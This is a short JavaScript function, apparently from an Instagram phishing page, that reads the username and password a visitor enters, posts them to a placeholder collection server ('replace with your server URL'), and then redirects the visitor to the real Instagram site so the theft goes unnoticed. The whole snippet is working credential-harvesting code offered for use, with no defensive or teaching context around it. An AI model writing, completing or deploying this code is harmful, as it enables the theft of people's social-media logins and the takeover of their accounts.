function submitForm() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Send data to a server (replace with your server URL)
    fetch('https://your-server.com/log', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ username, password }),
    })
    .then(response => {
        // Redirect to real Instagram after capturing data
        window.location.href = 'https://www.instagram.com';
    })
    .catch(error => console.error('Error:', error));
}
